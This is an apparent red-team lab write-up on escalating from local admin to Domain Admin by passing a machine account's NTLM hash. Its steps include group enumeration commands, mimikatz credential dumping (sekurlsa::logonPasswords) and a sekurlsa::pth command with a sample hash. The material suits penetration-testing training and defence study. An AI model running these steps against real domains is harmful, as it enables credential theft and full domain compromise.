# Pass the Hash with Machine$ Accounts

This lab looks at leveraging machine account NTLM password hashes or more specifically - how they can be used in pass the hash attacks to gain additional privileges, depending on which groups the machine is a member of \(ideally administrators/domain administrators\).

This labs is based on an assumption that you have gained local administrator privileges on a workstation \(machine\), let's call it `WS01$`. Since you have done your AD enumeration, you notice that the WS01$ is a member of `Domain Admins` group - congratulations, you are one step away from escalating from local admin to Domain Admin and a full domain compromise.

## Execution

Finding domain computers that are members of interesting groups:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-16-03-19.png)

Of course, the same can be observed by simply checking the Domain Admins net group:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
net group "domain admins" /domain
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-17-22-59.png)

or administrators group \(not applicable to our lab, but showing as a sidenote\):

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
net localgroup administrators /domain
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-17-24-07.png)

In AD, the highlighted part can be seen here:

![](../../.gitbook/assets/screenshot-from-2018-12-29-16-36-17.png)

Extracting the machine `WS01$` NTLM hash after the admin privileges were gained on the system:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
sekurlsa::logonPasswords
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-15-29-17.png)

Let's check that our current compromised user `ws01\mantvydas` \(local admin on ws01\) cannot access the domain controller DC01 just yet:

![](../../.gitbook/assets/screenshot-from-2018-12-29-15-47-10.png)

Since WS01$ machine is a member of `Domain Admins` and we have extracted the machine's hash with mimikatz, we can use mimikatz to pass that hash and effectively elevate our access to Domain Admin:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
sekurlsa::pth /user:ws01$ /domain:offense.local /ntlm:ab53503b0f35c9883ff89b75527d5861
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2018-12-29-15-52-35.png)

Below shows how the machine's hash is passed which results in an elevated cmd.exe prompt. Using the elevated prompt enables us to access the domain controller as shown with `dir \\dc01\c$`:

![](../../.gitbook/assets/peek-2018-12-29-15-49.gif)

## References

{% embed url="https://blog.secarma.co.uk/labs/using-machine-account-passwords-during-an-engagement" %}

{% embed url="https://www.c0d3xpl0it.com/2018/05/machine-accounts-in-pentest-engagement.html?m=1" %}

